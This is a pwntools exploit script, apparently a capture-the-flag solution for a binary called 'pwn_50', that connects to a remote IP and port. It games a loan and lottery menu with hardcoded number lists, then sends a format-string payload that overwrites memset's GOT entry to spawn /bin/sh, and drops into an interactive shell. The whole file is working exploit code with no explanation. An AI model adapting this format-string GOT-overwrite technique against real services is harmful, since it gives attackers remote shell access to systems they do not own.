from pwn import *

#s = process("./pwn_50")
s = remote("112.166.114.144", 35122)
e = ELF("./pwn_50")
#context.log_level = 'debug'

def loan():
    for i in range(5):
        s.recvuntil("[>]")
        s.sendline("2")
        s.recvuntil("[>]")
        s.sendline("1")
        s.recvuntil("[>]")
        s.sendline("100000000")
        s.recv()
        s.sendline("\n")
        s.recvuntil("[>]")
        s.sendline("4")

def lotto():
    lotto_list = [[29,44,73,80,24,71], [56,40,70,2,42,41], [6,26,96,5,43,55], [80,56,99,9,61,34], [27,18,45,77,92,11], [33,19,55,4,96,76], [74,53,14,44,52,55], [82,57,78,77,60,21], [30,40,75,29,47,36], [63,73,51,6,50,41], [16,82,60,70,84,54], [44,58,5,57,1,55], [10,82,12,88,57,69], [7,87,8,79,16,54], [15,76,25,66,81,74], [7,97,54,64,65,38], [17,10,94,21,64,92], [75,74,72,85,60,30]]

    for i in range(16):
        s.recvuntil("[>]")
        s.sendline("1")
        s.recvuntil("[>]")
        s.sendline("1")
        
        for j in range(6):
            s.recvuntil(": ")
            s.sendline(str(lotto_list[i][j]))
        s.recvuntil("Enter.")
        s.send("\n")
        s.send("\n")

        s.recvuntil("[>]")
        s.sendline("2")
    
        s.recvuntil("[>]")
        s.sendline("3")


def fsb():
    s.recvuntil("[>]")
    s.sendline("2")
    s.recvuntil("[>]")
    s.sendline("3")
    s.recvuntil("[>]")
    s.sendline("1")
    s.recvuntil(")]")
    s.sendline("/bin/sh\x00")
    s.recvuntil(")]")
    s.sendline("sh\n")
    s.recvuntil(")]")
    s.sendline("1")
    s.recvuntil("Thank you~!")
    s.send("\n")
    s.recvuntil("[>]")
    s.sendline("4")
    s.recvuntil("[>]")
    s.sendline("sh\n")
    s.recvuntil("[>]")

    payload = "AA"+p32(e.got['memset']+2) + p32(e.got['memset'])+"%2042x%4$hn%32316x%5$hn"
    s.sendline(payload)
    s.recvuntil("Thank you~ bye\n")

loan()
lotto()
fsb()
s.interactive()
